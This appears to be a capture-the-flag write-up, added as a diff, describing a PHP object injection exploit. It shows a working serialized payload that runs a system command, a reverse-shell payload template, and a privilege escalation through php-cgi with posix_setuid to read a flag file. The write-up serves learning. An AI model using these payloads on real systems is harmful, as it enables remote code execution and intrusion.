@@ -1,0 +1,33 @@
+Decided to randomly try out some things from vairous writeups / resrouces ( https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/ , https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md ... )
+And luckly, one payload actually worked: O:18:"PHPObjectInjection":1:{s:6:"inject";s:18:"system('ls -lah');";}
+
+total 276K 
+drwxr-xr-x 1 root root 4.0K May 7 09:31 . 
+drwxr-xr-x 1 root root 4.0K May 7 09:31 .. 
+-rw-r--r-- 1 root root 34K May 7 09:26 backup.zip 
+-rw-r--r-- 1 root root 0 May 7 09:26 blank.html 
+-rw-r--r-- 1 root root 2.4K May 7 09:26 index.php 
+-rw-r--r-- 1 root root 28K May 7 09:26 styleguide.html 
+-rw-r--r-- 1 root root 194K May 7 09:26 theme.css 
+-rw-r--r-- 1 root root 1008 May 7 09:26 theme.scss 
+object(PHPObjectInjection)#1 (1) { ["inject"]=> string(18) "system('ls -lah');" } total 276K drwxr-xr-x 1 root root 4.0K May 7 09:31 . drwxr-xr-x 1 root root 4.0K May 7 09:31 .. -rw-r--r-- 1 root root 34K May 7 09:26 backup.zip -rw-r--r-- 1 root root 0 May 7 09:26 blank.html -rw-r--r-- 1 root root 2.4K May 7 09:26 index.php -rw-r--r-- 1 root root 28K May 7 09:26 styleguide.html -rw-r--r-- 1 root root 194K May 7 09:26 theme.css -rw-r--r-- 1 root root 1008 May 7 09:26 theme.scss
+
+Next step was to upload a backdoor and get a reverse shell.
+PAYLOAD STURCUTRE: O:18:"PHPObjectInjection":1:{s:6:"inject";s:PAYLOAD SIZE:"system(REVERSE SHELL);";}
+
+Next step is to get the rights to read the flag.
+
+After some analysis, I ended up using php-cgi5.6.
+
+www-data@c4d8e063ddd3:/var/www$ /usr/bin/php-cgi5.6 -a
+Interactive mode enabled
+
+<?php
+posix_setuid(1001);
+system('cd /home/flavius/; cat flag.txt');
+>
+PHP Parse error:  syntax error, unexpected '>' in - on line 6
+Status: 500 Internal Server Error
+Content-type: text/html; charset=UTF-8
+
+ECSC{ef9a617ce799f76035269111f29ddf61c0271435ecb2a357de07b5b0e6e41b24}
